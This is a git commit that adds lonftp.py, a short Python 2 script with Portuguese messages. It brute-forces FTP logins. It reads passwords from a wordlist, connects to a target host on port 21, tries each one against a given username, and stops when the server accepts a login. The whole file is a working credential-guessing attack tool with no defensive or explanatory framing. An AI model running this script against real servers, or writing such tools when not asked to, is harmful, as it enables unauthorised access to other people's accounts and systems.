d2b1391bf1cff33f64759bddd35c30ad97c3e1a1
João Fracassi <joaobcfracassi@gmail.com>
2021-07-05 10:27:32 -0400

    Upload files.

---
+++ lonftp.py
@@ -0,0 +1,33 @@
+#!/usr/bin/python
+
+import socket, sys, re
+
+if len(sys.argv) != 3:
+	print "Modo de uso: python lonftp.py 127.0.0.1 usuario"
+	sys.exit()
+
+target = sys.argv[1]
+usuario = sys.argv[2]
+
+f = open("wl-ftp.txt")
+for palavra in f.readlines():
+	print "Realizando brute force FTP: %s:%s"%(usuario,palavra)
+	
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,21))
+	s.recv(1024)
+	
+	s.send("USER "+usuario+"\r\n")
+	s.recv(1024)
+	s.send("PASS "+palavra+"\r\n")
+	resposta = s.recv(1024)
+	s.send("QUIT\r\n")
+	
+	if re.search("230", resposta):
+		print "[+] Senha encontradas --->",palavra
+		break
+	else:
+		print "[-] Acesso negado!"
+	
+	
+	
